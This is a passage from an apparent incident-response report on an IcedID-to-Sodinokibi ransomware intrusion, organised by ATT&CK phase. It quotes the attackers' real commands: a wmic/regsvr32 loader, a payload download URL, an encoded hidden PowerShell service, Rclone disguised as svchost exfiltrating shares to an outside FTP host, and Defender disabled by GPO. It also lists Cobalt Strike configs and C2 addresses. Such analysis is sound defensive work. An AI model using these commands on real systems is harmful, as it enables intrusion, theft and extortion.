Strike Beacons from 2 different command and control servers, which were both used throughout the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.\n\nAfter compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.\n\nAdditional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.\n\nThree and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.\n\nAt the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag `-smode`, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.\n\nBooting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn’t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.\n\nOn certain systems, ransomware was executed without the `-smode` flag, and on other systems a dll was executed via `rundll32` to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.\n\nAbout 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn’t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis. The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.\n\n### Services\n\nOur Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it.\n\nWe also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a timeline detailing the events related to the Sodinokibi (REvil) ransomware attack. It outlines specific actions taken by threat actors, including the initial execution of IcedID, lateral movements to various servers, exfiltration of files, and the deployment of ransomware, along with the corresponding times and types of connections made during the attack. Each event is represented in a structured format, showing the progression of the attack over time.\nTranscription: |\n  Sodinokibi (aka REvil) Ransomware\n  \n  18:05 UTC Initial IcedID execution on beach head host\n  C2 connection: 161.35.109.168:443\n  \n  18:06 IcedID discovery initiated on host\n  \n  19:21 Cobalt Strike Beacons executed on beach head host\n  C2 connection: 45.86.163.78:443 cloudmetric.online\n  C2 connection: 195.189.99.74:443 smalleststores.com\n  \n  19:30 Lateral movement to Exchange server using Cobalt Strike\n  \n  19:53 Lateral movement to domain controller from Exchange server\n  \n  20:45 Threat actors begin moving laterally using RDP\n  \n  21:35 Exfiltration of files using Rclone\n  C2 connection: 45.147.160.5:443\n  \n  22:06 First deployment of ransomware using BITSAdmin\n  \n  22:07 Execution of Sodinokibi ransomware with -s mode flag by threat actor over RDP connection\n  \n  22:28 Final ransomware deployment\n```\n\n### MITRE ATT&CK\n\n#### Initial Access\n\nInitial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.\n\nThe delivery format was an xlsm file:\n\nInitial execution of the document writes a file to:\n\n```\nC:\\Users\\Public\\microsoft.security\n```\n\nThe Excel file called wmic to execute the file with regsrv32:\n\n```\nwmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n```\n\n```image\nAlt: wmic command\nDescription: The image displays a screenshot of a process list related to a cyber intrusion involving Sodinokibi (REvil) ransomware and IcedID malware. It shows the execution of Microsoft Excel, the WMIC command being used to create a process with regsvr32, and the path to a file located in the user's public directory. This information is relevant for understanding the steps taken in the malware's execution and the initial access method.\nTranscription: |\n  Processes\n  - C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\n    \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\" \"C:\\Users\\Admin\\AppData\\Local\\Temp\\Documents972.xlsm\"\n  \n  - C:\\Windows\\System32\\Wbem\\wmic.exe\n    wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n  \n  - C:\\Windows\\system32\\regsvr32.exe\n    regsvr32 -s C:\\Users\\Public\\microsoft.security\n```\n\nThis then made a network request to download a file from this URL:\n\n```\nhttp://vpu03jivmm03qncgx.com/index.gif\n```\n\nThe GIF however was the IcedID malware.\n\n```image\nAlt: IcedID\nDescription: The image displays an HTTP request log, specifically a GET request for an index.gif file. It includes headers such as 'Accept', 'User-Agent', 'Host', and 'Connection', as well as a response indicating a 200 OK status from an Apache server. The body of the response contains what appears to be corrupted or encoded data, hinting at the malicious content being delivered through the request.\n```\n\n#### Execution\n\nOnce IcedID was downloaded to the host, the malware was executed using `rundll32.exe`:\n\n```\nrundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\"\n```\n\nAfter execution, the malware made contact with `161.35.109[.]168` which it continued to beacon to, throughout the intrusion.\n\n#### Persistence\n\nIcedID setup persistence on the beach head host using a scheduled task.\n\n```\nwewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image depicts an XML configuration file for a scheduled task, related to the Sodinokibi (REvil) ransomware. It includes various settings such as triggers, execution policies, and commands to run a malicious executable. The task is set to execute at a defined time with specific parameters, emphasizing its persistence mechanism on a Windows system. Key elements like 'LogonTrigger' and 'Command' indicate how the task is scheduled to maintain the ransomware's presence on the infected system.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <TimeTrigger>\n        <Repetition>\n          <Interval>P1D</Interval>\n          <StopAtDurationEnd>false</StopAtDurationEnd>\n        </Repetition>\n        <StartBoundary>2012-01-01T12:00:00</StartBoundary>\n        <Enabled>true</Enabled>\n      </TimeTrigger>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId/>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew/MultipleInstancesPolicy</MultipleInstancesPolicy>\n      <DisallowStartOnBatteries>false</DisallowStartOnBatteries>\n      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n      <AllowHardTerminate>false</AllowHardTerminate>\n      <StartWhenAvailable>true</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>P10M</Duration>\n        <WaitTimeout>P1H</WaitTimeout>\n        <StopOnIdleEnd>false</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>P0S</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions context=\"Author\">\n      <Exec>\n        <Command>rundll32.exe</Command>\n        <Arguments>\"C:\\Users\\AppData\\Roaming\\douxiy\\Ciocca.dll\",update /i:\"DwarfWing\\license.dat\"</Arguments>\n      </Exec>\n    </Actions>\n  </Task>\n```\n\n```image\nAlt: Registry Key\nDescription: The image displays a technical overview of a registry modification related to the Sodinokibi (REvil) ransomware. It shows the created registry key along with its path: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}'. The registry modification section indicates the value type as '6', which is significant for understanding the persistence mechanism of the ransomware. Additionally, the image features a visual representation of processes such as wininit.exe, services.exe, and svchost.exe, implying the context of the executed ransomware environment.\nTranscription: |\n  wininit.exe\n  services.exe\n  svchost.exe\n  \n  created registry key\n  \n  Registry modification\n  \n  Registry key\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n  \n  Value type\n  6\n```\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\nThe execution of the ransomware executable created a RunOnce key for persistence.\n\n```\nHKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca\n```\n\n```image\nAlt: RunOnce Key\nDescription: The image displays a log entry related to a Windows event, specifically detailing a registry modification made by a process. Key components include the 'details' showing the path of the executable, 'eventType' indicating a value set operation, and 'targetObject' which specifies the registry path where the modification occurred. This log entry illustrates the use of a RunOnce key for persistence by ransomware, linking to the mentioned AstraZeneca key.\nTranscription: |\n  details          C:\\Windows\\*\\*.exe\n  eventType        SetValue\n  image            C:\\Windows\\*\\*.exe\n  processGuid      {b093c253-dfa5-604f-3c07-000000001008}\n  processId        6512\n  ruleName         technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder\n  targetObject     HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca\n  utcTime          *\n  channel          Microsoft-Windows-Sysmon/Operational\n```\n\n#### Privilege Escalation\n\nAfter completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the `wuauclt.exe` process executed several PowerShell functions for UAC bypasses including:\n\n- UAC-TokenMagic\n- Invoke-SluiBypass\n\n#### Defense Evasion\n\nAbout one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.\n\n```image\nAlt: Cobalt Strike Servers\nDescription: The image is a flow diagram illustrating the connection between IcedID and Cobalt Strike. It depicts a command execution process using 'rundll32.exe' to run a specified file path, which leads to the creation of remote threads via 'Cmd.exe'. Various IP addresses and domain names are displayed, indicating the external servers contacted during the process. The diagram provides a clear visual representation of the malware's behavior and the specific commands executed, making it relevant to Cyber Threat Intelligence.\nTranscription: |\n  IcedID to Cobalt Strike\n  ----------------------------------------\n  rundll32.exe \"C:\\Users\\UserName\\AppData\\Local\\Temp\\skull-x64.dat\", update /i:\"DwarfWing\\license.dat\"\n      ├── Create Remote Thread Cmd.exe\n      │       └── 45.86.163.78:80\n      │               └── Explorer.exe\n      │                       ├── 45.86.163.78:443\n      │                       │       └── cloudmetric.online\n      │                       └── WUAUCLT.exe\n      └── Create Remote Thread Cmd.exe\n              └── 195.189.99.74:443\n                      └── smalleststores.com\n```\n\nProcess injection was used multiple times across the environment using Cobalt Strike Beacons.\n\n```image\nAlt: Process Injection\nDescription: The image displays a log entry related to a security alert about process injection. It includes specific details such as the rule name, timestamps, source and target process GUIDs, process IDs, and the associated images. This technical information indicates a potential security threat where one process is attempting to inject code into another, a common tactic used by malware.\nTranscription: |\n  \"CreateRemoteThread detected:\n  RuleName: technique_id=T1055, technique_name=Process Injection\n  UtcTime:\n  SourceProcessGuid: {4d5468e-bb44-604f-8219-000000000000}\n  SourceProcessId: 4208\n  SourceImage: C:\\Windows\\SysWOW64\\rundll32.exe\n  TargetProcessGuid: {4d5468e-4969-6047-1c00-000000000000}\n  TargetProcessId: 1412\n  TargetImage: C:\\Windows\\System32\\svchost.exe\n  NewThreadId: 3996\n  StartAddress: 0x00000000003D0003\n  StartModule: -\n  StartFunction: -\"\n```\n\nPrior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\n\n```image\nAlt: GPO\nDescription: The image displays a detailed log of a process creation event related to the PowerShell technique within the MITRE ATT&CK framework. It includes various technical details such as RuleName, ProcessGuid, ProcessId, Image, and Description, indicating that the process is associated with Microsoft Management Console. Additional information includes command line parameters, parent process details, and hash values for integrity and verification. This log provides insights into the execution context and behavior of a potentially malicious process.\nTranscription: |\n  Process Create:\n    RuleName: technique id=T1059.001.technique_name=PowerShell\n    UtcTime:\n    ProcessGuid: {46d5468e-d592-604f-401a-000000000000}\n    ProcessId: 1572\n    Image: C:\\Windows\\System32\\mmc.exe\n    FileVersion:\n    Description: Microsoft Management Console\n    Product: Microsoft Windows® Operating System\n    Company: Microsoft Corporation\n    OriginalFileName: mmc.exe\n    CommandLine: \"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\gpmc.msc\"\n    CurrentDirectory: C:\\Users\\\n    User:\n    LogonGuid:\n    LogonId:\n    TerminalSessionId: 3\n    IntegrityLevel: High\n    Hashes:\n      SHA1: 715ABDA53ECDAD6A136F56A41A97444F24CA3195, MD5: 0ED2577AA82A3B1C155843F23B7E377D2\n    ParentProcessGuid: {46d5468e-d526-604f-341a-000000000000}\n    ParentProcessId: 5268\n    ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n    ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n```\n\nThe GPO was named “new”.\n\n```image\nAlt: GPO Name\nDescription: The image displays a section of a Group Policy Object (GPO) configuration related to Windows Defender Antivirus. It shows the 'Computer Configuration (Enabled)' header, followed by 'Policies' and 'Administrative Templates.' Under 'Windows Components/Windows Defender Antivirus,' two policies are listed: 'Turn off routine remediation' and 'Turn off Windows Defender Antivirus,' both marked as 'Enabled.' This indicates that these settings were altered to disable essential security measures, likely in the context of a cyber threat scenario involving ransomware.\nTranscription: |\n  Computer Configuration (Enabled)\n  Policies\n    Administrative Templates\n      Policy definitions (ADMX files) retrieved from the local computer.\n        Windows Components/Windows Defender Antivirus\n          Policy                                 Setting\n          Turn off routine remediation           Enabled\n          Turn off Windows Defender Antivirus    Enabled\n```\n\n#### Credential Access\n\nCredentials were dumped on a server and domain controller using a Cobalt Strike Beacon.\n\n```image\nAlt: Credential Dump\nDescription: The image displays a detailed technical breakdown of two processes related to credential dumping, likely from a cybersecurity analysis of a ransomware incident. It includes information on the processes '2f092e6.exe' and 'lsass.exe,' showing attributes such as execution time, path, integrity level, access privileges, process ID, command line, and cryptographic hashes (SHA1 and SHA256) for 'lsass.exe.' The structure indicates a hierarchical representation of process relationships, providing insights into how the malware operates.\nTranscription: |\n  2f092e6.exe\n  - Process name: 2f092e6.exe\n  - Execution time: [REDACTED]\n  - Path: \\\\[REDACTED]\\ADMIN$\\2f092e6.exe\n  - Integrity level: System\n  - Access privileges (UAC): Default\n  - Process ID: 4836\n  - Command line: 2f092e6.exe\n  \n      rundll32.exe\n      └── wuauserv.exe\n          └── lsass.exe\n              - Process name: lsass.exe\n              - Execution time: [REDACTED]\n              - Path: C:\\Windows\\System32\\lsass.exe\n              - Integrity level: System\n              - Access privileges (UAC): Default\n              - Process ID: 592\n              - Command line: lsass.exe\n              - File name: lsass.exe\n              - Full path: C:\\Windows\\System32\\lsass.exe\n              - SHA1: 0fb26350106c9bdd196d4e7d01eb30\n              - SHA256: bbc83e4759d4b82bad31e371ad679a\n              - Signer: Unknown\n```\n\n#### Discovery\n\nInitial discovery by the IcedID malware occurred within minutes of execution:\n\n```\ncmd.exe /c chcp >&2\nWMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nipconfig.exe ipconfig /all\nsysteminfo\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet.exe net group \"Domain Admins\" /domain\n```\n\nA flurry of LDAP queries were seen coming from `wuauclt.exe` (Cobalt Strike) on the beachhead.\n\n```\n\"DistinguishedName\": \"CN=Terminal Server License Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n\"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n...\n```\n\nWe believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\n\n```image\nAlt: BloodHound Results\nDescription: The image displays a detailed breakdown of the process 'wuauclt.exe', including various attributes such as execution time, path, integrity level, access privileges, process ID, command line, file name, full path, SHA1, SHA256 hashes, signer, and issuer. Additionally, it shows a created file named 'BloodHound.zip' with its own attributes, including file name, full path, SHA1, SHA256 hashes, and signer information. This information is crucial for understanding the context of the Sodinokibi (REvil) ransomware's discovery phase and its associated activities.\nTranscription: |\n  Process name: wuauclt.exe\n  Execution time: Mar [redacted]\n  Path: c:\\windows\\system32\\wuauclt.exe\n  Integrity level: Medium\n  Access privileges (UAC): Restricted\n  Process ID: 624\n  Command line: WUAUCLT.exe\n  File name: wuauclt.exe\n  Full path: c:\\windows\\system32\\wuauclt.exe\n  SHA1: 58680265bb320f64920f6ec03702dca63b7c2\n  SHA256: efa27c2ee5a31f1fe4a1d59023702560614aa55\n  Signer: Microsoft Windows\n  Issuer: Microsoft Windows Production PCA 2011\n  \n  created file:\n  202103[redacted]_BloodHound.zip\n  File name: 202103[redacted]_BloodHound.zip\n  Full path: C:\\Users\\Public\\202103[redacted]_BloodHound.zip\n  SHA1: 5464e073dd8af58fce96b870587666f6f4c1e\n  SHA256: 2f390719b83dc67b62db8291bdfb80839964\n  Signer: Unknown\n```\n\nOnce on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.\n\nAdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.\n\n```image\nAlt: AdFind\nDescription: The image displays detailed information about the execution of the AdFind.exe process, including its command line arguments, file paths, and cryptographic hashes (SHA1 and SHA256). It shows the process tree with AdFind.exe as a child of cmd.exe and rundll32.exe, indicating the execution context. The image also includes details such as process ID, integrity level, and access privileges, which are relevant for understanding potential security incidents involving this tool.\nTranscription: |\n  AdFind.exe\n  - Process Name: AdFind.exe\n  - Execution time: [REDACTED]\n  - Path: c:\\users\\public\\adfind.exe\n  - Integrity level: System\n  - Access privileges (UAC): Standard\n  - Process ID: 1068\n  - Command line: adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  - File Name: AdFind.exe\n  - Full path: c:\\users\\public\\adfind.exe\n  - SHA1: 4f48fc0f9b47d0ad95d159201fe7e72fbc844\n  - SHA256: c92c158d7c37fea795114fa6491fe5f145ad2f\n  - Signer: Unknown\n  \n  some.csv\n  - File Name: some.csv\n  - Full path: C:\\Users\\Public\\some.csv\n  - SHA1: 1c6e6237597881509769443aa477e1f403\n  - SHA256: 47a71807771fa2c48147ca0f3440a02fdc\n  - Signer: Unknown\n```\n\n```\ncmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv\n```\n\n#### Lateral Movement\n\nFor lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\n\n```image\nAlt: Cobalt Strike Lateral Movement\nDescription: The image is a diagram illustrating the lateral movement of Cobalt Strike within a network. It shows an 'Infected Workstation' connecting to an 'Exchange Server', which then links to 'Domain Controllers', 'Servers', and 'Workstations'. The connections are represented with arrows, indicating the pathways of lateral movement in a compromised environment. The diagram is clearly labeled, making it easy to understand the relationships and flow of potential threats.\nTranscription: |\n  Cobalt Strike Lateral Movement\n  - Infected Workstation\n    - Exchange Server\n      - Domain Controllers\n      - Servers\n      - Workstations\n```\n\nCobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\n\n```image\nAlt: SMB Transfer\nDescription: The image displays a log entry related to a system event, specifically the creation of a file. It includes technical details such as the Process GUID, Process ID, image source (System), and the target filename 'C:\\Windows\\0ddb81e.exe'. This log entry is relevant to monitoring and analyzing potential malicious activity, likely in the context of ransomware deployment.\nTranscription: |\n  data.win.system.level\n  4\n  data.win.system.message\n  \"File created:\n  RuleName: -\n  UtcTime:\n  ProcessGuid: {78E9F60F-D30F-6048-0100-000000000080}\n  ProcessId: 4\n  Image: System\n  TargetFilename: C:\\Windows\\0ddb81e.exe\n  CreationUtcTime:\n```\n\n```image\nAlt: Remote Service Execution\nDescription: The image displays a log entry from a Windows system indicating that a new service was installed. It includes details such as the service name ('@ddb81e'), the service file path ('\\ADMONS\\@ddb81e.exe'), the service type (user mode service), the service start type (demand start), and the service account (LocalSystem). This data is relevant for understanding potential malicious activities, particularly in the context of ransomware attacks like Sodinokibi (REvil), as it shows how threat actors may install services to maintain persistence.\nTranscription: |\n  data.win.system.level 4\n  data.win.system.message \"A service was installed in the system.\n  \n  Service Name: @ddb81e\n  Service File Name: \\\\ADMIN$\\@ddb81e.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\n```image\nAlt: PowerShell Execution\nDescription: The image displays a text output that appears to be a service installation log related to a ransomware attack. It includes a service name (39884d), service file path indicating the use of PowerShell with an encoded command, and details about the service type, start type, and service account. The content is highly technical and relevant to cyber threat intelligence, specifically illustrating how a malicious service may be set up within a compromised system.\nTranscription: |\n  \"A service was installed in the system.\n  Service Name: 398843\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD8ATgBlAHcAQQB1AG8AIAAgAEcAIAAgAFAuAG8AbgAIAEwAbgAIAEwAbg...\n```\n\nTo facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.\n\n#### Collection\n\nThe Rclone utility was used to collect information from file shares and to exfiltrate the data.\n\n```\nsvchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n```image\nAlt: Rclone\nDescription: The image is a screenshot of a command line interface displaying technical details about the Rclone utility. It includes information such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), description (Rsync for cloud storage), product name (Rclone), company URL (https://rclone.org), and the original filename (rclone.exe). Additionally, it shows the command line used for executing Rclone to copy files from a specified network share to an FTP location.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n#### Command and Control\n\nIcedID:\n\n- cikawemoret34.space\n- 206.189.10.247:80\n\n```\nnomovee.website\n161.35.109.168:443\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ec74a5c51106f0419184d0dd08fb05bc\n```\n\n**Certificate:**\n\n```\ne0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43\nNot Before: 2021/03/11 02:06:51\nNot After: 2022/03/11 02:06:51\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike:\n\n- 45.86.163.78:443\n- cloudmetric.online\n- JA3: a0e9f5d64349fb13191bc781f81f42e1\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\nb9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3\nNot Before: 2021/02/27 06:45:42\nNot After: 2021/05/28 07:45:42\nIssuer Org: Let's Encrypt\nSubject Common: cloudmetric.online\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x64\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\",\n    \"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\",\n    \"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\",\n    \"time\": 1615840900656.6\n  },\n  \"x86\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\",\n    \"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\",\n    \"md5\": \"bbc6592c67d233640a9ca0d0d915003c\",\n    \"time\": 1615840895189\n  }\n}\n```\n\n- 195.189.99.74\n- smalleststores.com\n- JA3: 72a589da586844d7f0818ce684948eea\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\n14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df\nNot Before: 2021/03/11 11:02:43\nNot After: 2021/06/09 12:02:43\nIssuer Org: Let's Encrypt\nSubject Common: smalleststores.com\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x86\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"88365eb3d504f570f22d76f777ab2caf\",\n    \"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\",\n    \"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\",\n    \"time\": 1615846680369.8\n  },\n  \"x64\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\",\n    \"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\",\n    \"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\",\n    \"time\": 1615846684589\n  }\n}\n```\n\n#### Exfiltration\n\nData that was collected from the domain was exfiltrated to a remote server at:\n\n```\n45.147.160.5:443\n```\n\n```image\nAlt: Exfiltration\nDescription: The image displays a terminal output showing details about a specific executable process related to cloud storage synchronization. It lists various attributes such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), a description (Rsync for cloud storage), product name (Rclone), company website, original filename (rclone.exe), and the command line used to execute the process. This information is typically relevant to cybersecurity analysis, particularly in identifying potential malicious activity associated with the Sodinokibi (REvil) ransomware.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\\\c$\\path\" ftp://user:password@host/path/\n```\n\n```image\nAlt: Exfiltration\nDescription: The image shows a detailed technical analysis related to the Sodinokibi (REvil) ransomware, specifically focusing on the exfiltration process. It includes information about the 'svchost.exe' process, such as its execution time, file path, integrity level, access privileges, and process ID. The command line used for executing 'svchost.exe' is displayed, indicating that it involved a file transfer, likely for data exfiltration. Additionally, the image provides cryptographic hashes (SHA1 and SHA256) for the 'svchost.exe' file, along with the IP address (45.147.160.5) and port (443) to which the connection was established, categorizing it under TCP protocol.\nTranscription: |\n  svchost.exe\n    Process name: svchost.exe\n    Execution time: [REDACTED]\n    Path: c:\\windows\\svchost.exe\n    Integrity level: System\n    Access privileges (UAC): Standard\n    Process ID: 2364\n    Command line: svchost.exe --config svchost.conf --progress 